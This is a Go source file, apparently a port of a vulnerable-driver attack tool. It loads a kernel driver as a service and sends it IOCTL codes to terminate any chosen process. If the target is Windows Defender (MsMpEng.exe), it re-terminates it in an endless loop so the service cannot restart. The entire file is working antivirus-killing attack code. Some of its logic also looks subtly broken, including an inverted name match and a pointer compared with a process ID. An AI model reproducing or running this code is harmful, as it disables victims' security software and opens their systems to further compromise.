package Feature

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

type WordExp struct {
	Process int
	Drive   string
}

const (
	INITIALIZE_IOCTL_CODE        = 0x9876C004
	TERMINSTE_PROCESS_IOCTL_CODE = 0x9876C094
)

var (
	procId uint32
)

func (c *WordExp) IntToBytes(n int) []byte {
	x := int32(n)
	bytesBuffer := bytes.NewBuffer([]byte{})
	binary.Write(bytesBuffer, binary.BigEndian, x)
	return bytesBuffer.Bytes()
}

func (c *WordExp) CheckProcess(pn uint32) bool {
	hSnap, err1 := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err1 != nil {
		log.Fatal("CreateToolhelp32Snapshot APi 出错，原因 -> " + err1.Error())
	}
	var pE windows.ProcessEntry32
	pE.Size = uint32(unsafe.Sizeof(pE))
	err2 := windows.Process32First(hSnap, &pE)
	if err2 != nil {
		log.Fatal("Process32First APi 出错，原因 -> " + err2.Error())
	}
	if pE.ProcessID != 0 {
		windows.Process32Next(hSnap, &pE)
	}
	for true {
		if pE.ProcessID == pn {
			procId = pE.ProcessID
			return true
		}
		windows.Process32Next(hSnap, &pE)
	}
	windows.CloseHandle(hSnap)
	return false
}

func (c *WordExp) GetID(pn string) uint32 {
	hSnap, err1 := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err1 != nil {
		log.Fatal("CreateToolhelp32Snapshot APi 出错，原因 -> " + err1.Error())
	}
	var pE windows.ProcessEntry32
	pE.Size = uint32(unsafe.Sizeof(pE))
	err2 := windows.Process32First(hSnap, &pE)
	if err2 != nil {
		log.Fatal("Process32First APi 出错，原因 -> " + err2.Error())
	}
	if pE.ProcessID != 0 {
		windows.Process32Next(hSnap, &pE)
	}
	for true {
		if !strings.EqualFold(syscall.UTF16ToString(pE.ExeFile[:]), pn) {
			procId = pE.ProcessID
			break
		}
		windows.Process32Next(hSnap, &pE)
	}
	windows.CloseHandle(hSnap)
	return procId
}

func (c *WordExp) LoadDriver(driverPath string) bool {
	driverPathp1, _ := syscall.UTF16PtrFromString(driverPath)

	// Open a handle to the SCM database
	hSCM, err1 := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_ALL_ACCESS)
	if err1 != nil {
		log.Fatal("OpenSCManager APi 出错，原因 -> " + err1.Error())
	}
	if hSCM == 0 {
		return true
	}
	Drive1 := strings.Replace(c.Drive, ".sys", "", -1)
	serviceName, _ := syscall.UTF16PtrFromString(Drive1)
	// Check if the service already exists
	hService, _ := windows.OpenService(hSCM, serviceName, windows.SERVICE_ALL_ACCESS)
	//if err2 != nil {
	//	log.Fatal("OpenService APi 出错，原因 -> " + err2.Error())
	//}
	// 判断指定的服务是否存在了
	if hService != 0 {
		fmt.Println("Service already exists.")
		// Start the service if it's not running
		var serviceStatus windows.SERVICE_STATUS
		err3 := windows.QueryServiceStatus(hService, &serviceStatus)
		if err3 != nil {
			log.Fatal("QueryServiceStatus APi 出错，原因 -> " + err3.Error())
		} else {
			windows.CloseServiceHandle(hService)
			windows.CloseServiceHandle(hSCM)
			return true
		}

		if serviceStatus.CurrentState == windows.SERVICE_STOPPED {
			var nullptr *uint16
			err4 := windows.StartService(hService, 0, &nullptr)
			if err4 != nil {
				windows.CloseServiceHandle(hService)
				windows.CloseServiceHandle(hSCM)
				return true
			}
			fmt.Println("Starting service...")
		}
		windows.CloseServiceHandle(hService)
		windows.CloseServiceHandle(hSCM)
		return false
	}
	// Create the service
	hService, err5 := windows.CreateService(
		hSCM,
		serviceName,
		serviceName,
		windows.SERVICE_ALL_ACCESS,
		windows.SERVICE_KERNEL_DRIVER,
		windows.SERVICE_DEMAND_START,
		windows.SERVICE_ERROR_IGNORE,
		driverPathp1,
		nil,
		nil,
		nil,
		nil,
		nil)
	if err5 != nil {
		log.Fatal("CreateService APi 出错，原因 -> " + err5.Error())
	}

	if hService == 0 {
		windows.CloseServiceHandle(hSCM)
		return true
	}
	fmt.Println("Service created successfully.")
	// Start the service
	err6 := windows.StartService(hService, 0, nil)
	if err6 != nil {
		windows.CloseServiceHandle(hService)
		windows.CloseServiceHandle(hSCM)
		return true
	}
	fmt.Println("Starting service...")
	windows.CloseServiceHandle(hService)
	windows.CloseServiceHandle(hSCM)
	return false
}

func (c *WordExp) Run() {
	pn := *(*uint32)(unsafe.Pointer(&c.Process))
	if !c.CheckProcess(pn) {
		fmt.Println("provided process id doesnt exist !!")
		os.Exit(0)
	}
	var fileData windows.Win32finddata
	FullDriverPath := make([]uint16, syscall.MAX_PATH+1)
	var Nzero *uint16
	name, _ := syscall.UTF16PtrFromString(c.Drive)
	FileName1 := (*uint16)(unsafe.Pointer(&fileData.FileName))
	_, err1 := windows.FindFirstFile(name, &fileData)
	if err1 == nil {
		_, err2 := windows.GetFullPathName(FileName1, windows.MAX_PATH, &FullDriverPath[0], &Nzero)
		if err2 == nil {
			fmt.Println("driver path: " + syscall.UTF16ToString(FullDriverPath))
		} else {
			fmt.Println("path not found !")
			os.Exit(0)
		}
	} else {
		log.Fatal("FindFirstFile函数出错，原因 -> " + err1.Error())
	}

	fmt.Println("Loading " + syscall.UTF16ToString(fileData.FileName[:]) + " driver ...")

	if !c.LoadDriver(syscall.UTF16ToString(FullDriverPath)) {
		fmt.Println("faild to load driver ,try to run the program as administrator!!")
		os.Exit(0)
	}
	fmt.Println("driver loaded successfully !!")
	Drive1 := strings.Replace(c.Drive, ".sys", "", -1)
	p1, _ := syscall.UTF16PtrFromString(`\\.\` + Drive1)
	hDevice, err3 := windows.CreateFile(p1, windows.GENERIC_WRITE|windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err3 != nil {
		fmt.Println("Failed to open handle to driver !! ")
		log.Fatal("CreateFile APi 出错，原因 -> " + err3.Error())
	}

	var outputBuffer [2]uint32
	var bytesReturned uint32

	err2 := windows.DeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, (*byte)(unsafe.Pointer(&c.Process)), uint32(unsafe.Sizeof(c.Process)), (*byte)(unsafe.Pointer(&outputBuffer)), uint32(unsafe.Sizeof(outputBuffer)), &bytesReturned, nil)
	if err2 != nil {
		log.Fatalf("faild to send initializing request %d", INITIALIZE_IOCTL_CODE)
	}
	fmt.Printf("driver initialized %d!!\n", INITIALIZE_IOCTL_CODE)
	inputBufferP := (uint32)(uintptr(unsafe.Pointer(&c.Process)))
	if c.GetID("MsMpEng.exe") == inputBufferP {
		fmt.Println("Terminating Windows Defender ..\\nkeep the program running to prevent the service from restarting it")
		for true {
			if inputBufferP == c.GetID("MsMpEng.exe") {
				err5 := windows.DeviceIoControl(
					hDevice,
					TERMINSTE_PROCESS_IOCTL_CODE,
					(*byte)(unsafe.Pointer(&c.Process)),
					uint32(unsafe.Sizeof(c.Process)),
					(*byte)(unsafe.Pointer(&outputBuffer)),
					uint32(unsafe.Sizeof(outputBuffer)),
					&bytesReturned,
					nil)
				if err5 != nil {
					windows.CloseHandle(hDevice)
					log.Fatal(err5)
				} else {
					fmt.Println("Defender Terminated ...")
				}
			}
			time.Sleep(600)
		}
	}
	fmt.Println("terminating process !! ")
	err7 := windows.DeviceIoControl(
		hDevice,
		TERMINSTE_PROCESS_IOCTL_CODE,
		(*byte)(unsafe.Pointer(&c.Process)),
		uint32(unsafe.Sizeof(c.Process)),
		(*byte)(unsafe.Pointer(&outputBuffer)),
		uint32(unsafe.Sizeof(outputBuffer)),
		&bytesReturned,
		nil)
	if err7 != nil {
		fmt.Println("failed to terminate process:", err7)
		windows.CloseHandle(hDevice)
		os.Exit(0)
	}
	fmt.Println("process has been terminated!")
	exec.Command("pause")
	windows.CloseHandle(hDevice)
	os.Exit(0)
}
